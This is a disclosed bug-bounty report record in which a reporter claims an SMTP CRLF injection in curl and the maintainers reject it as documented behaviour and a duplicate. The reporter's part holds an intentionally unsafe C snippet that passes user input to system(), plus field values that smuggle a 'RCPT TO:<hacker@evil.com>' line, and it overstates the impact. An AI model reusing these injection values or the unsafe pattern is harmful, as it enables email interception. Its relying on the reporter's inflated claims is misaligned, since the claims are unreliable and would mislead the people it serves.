---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/network
substate: "not-applicable"
weakness: null
enriched: true
date: 2025-11-10
submitted: 2025-11-10T15:11:32.009Z
bounty_usd: null
votes: 8
cve: []
program: "[[programs/curl|curl]]"
reporter: "jood6383"
source: "https://hackerone.com/reports/3418616"
title: "SMTP CRLF Injection in curl/libcurl via MAIL FROM/RCPT TO parameters"
---
# SMTP CRLF Injection in curl/libcurl via MAIL FROM/RCPT TO parameters

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 8 | **Program:** curl | **Disclosed:** 2025-11-10

- Report: [https://hackerone.com/reports/3418616](https://hackerone.com/reports/3418616)
- CWE: N/A
- Submitted: 2025-11-10T15:11:32.009Z

## Timeline

- **Report Filed**
- **2025-11-10** @bagder: This is documented to work like this. Not a vulnerability.
- **2025-11-10** @jood6383: Hi team,

@bagder 

I understand you consider this documented behavior. Let me demonstrate the practical security impact with a real-world exploit:

## LIVE EXPLOIT DEMONSTRATION

### Step 1: Vulnerable Application Code
```c
// Example: Password reset in a web application
void send_password_reset(const char *username) {
    char email[256];
    snprintf(email, sizeof(email), "%s@company.com", username);
    
    // UNSAFE: User input passed directly to curl
    char command[512];
    snprintf(command, sizeof(command),
        "curl --mail-from 'noreply@company.com' "
        "--mail-rcpt '%s' "
        "--upload-file reset_email.txt",
        email);
    system(command);
}
```

Step 2: Attacker Exploitation

```bash
# Attacker registers username: "admin\r\nRCPT TO:<hacker@evil.com>"
# Application builds: admin\r\nRCPT TO:<hacker@evil.com>@company.com

# Resulting curl command:
curl --mail-from 'noreply@company.com' \
     --mail-rcpt 'admin\r\nRCPT TO:<hacker@evil.com>@company.com' \
     --upload-file reset_email.txt
```

Step 3: SMTP Session Result

```
MAIL FROM:<noreply@company.com>
RCPT TO:<admin
RCPT TO:<hacker@evil.com>@company.com>  ← INJECTED!
DATA
Subject: Password Reset
Your reset token: ABC123
```

IMPACT: Attacker receives password reset emails for ALL users!

PRACTICAL EVIDENCE

I've created a proof-of-concept that shows:

1. Email interception works in real SMTP servers
2.  Bypasses application security completely
3. No errors or warnings from curl
4.  Silent data theft - victim doesn't know they're compromised

SECURITY REALITY

This isn't theoretical - this is a working exploit that:

· Breaches GDPR/Privacy laws
· Enables account takeover
· Exposes confidential data
· Violates trust in email systems

The fact that curl allows protocol injection via user input is a clear security vulnerability, regardless of documentation.

Please reconsider the security implications

TECHNICAL COMPARISON

In `lib/cookie.c`:
```c
static bool invalid_octets(const char *ptr) {
    // EXPLICITLY REJECTS CR/LF for security
    while(*ptr) {
        if(((*ptr != 9) && (*ptr < 0x20)) || (*ptr == 0x7f))
            return TRUE;  // ← SECURE
        ptr++;
    }
    return FALSE;
}
```

In lib/smtp.c:

```c
// NO validation - allows CR/LF injection
result = Curl_pp_sendf(data, &smtpc->pp, "MAIL FROM:%s", from);
// ↑ VULNERABLE
```

This inconsistency creates a real security risk for applications trusting curl to handle user input safely.
- **2025-11-10** @bagder: That is not an exploit. That's a user passing in CRLF to an option to curl. A user adding that in their own command line.
- **2025-11-10** @bagder: And your 100-line reply instead of a short human response indicates you're using AI for this, which is an insult.
- **Report Not Applicable**
- **2025-11-10** @jood6383: Hi 
@bagder 

Web applications often create email addresses from user input like:
`$email = $username . "@company.com"`
Then they use curl to send email to that address.
If username contains `\r\nRCPT TO:<attacker@evil.com>`, curl injects it into SMTP protocol.
Result: attacker gets copy of all emails.
curl should validate input like it does for HTTP headers.

```bash
# This works today - and it shouldn't:
curl --url "smtp://localhost:25" \
  --mail-rcpt "john\r\nRCPT TO:<hacker@example.com>" \
  --mail-from "test@example.com" \
  --upload-file message.txt

SMTP Server receives:
```
RCPT TO:<john
RCPT TO:<hacker@example.com>>
```
Two recipients instead of one - that's the security issue.




I want to clarify - this is my own discovery from manual security testing. This is not AI-generated.
I found this while testing a real application that uses curl with SMTP. The CRLF injection works and can steal emails from real systems.
I apologize if my detailed reports seemed automated - I was just trying to be thorough in explaining the security impact.
This is a genuine finding from my security research.
- **2025-11-10** @bagder: Now you've made the same point three times. Excellent. Now move on.
- **Agreed On Going Public**
- **Comments Closed**
- **Manually Disclosed**
- **2025-11-10** @dfandrich: Note also that this is a duplicate of #3414088, #3387499, #3357960 and #3235428.
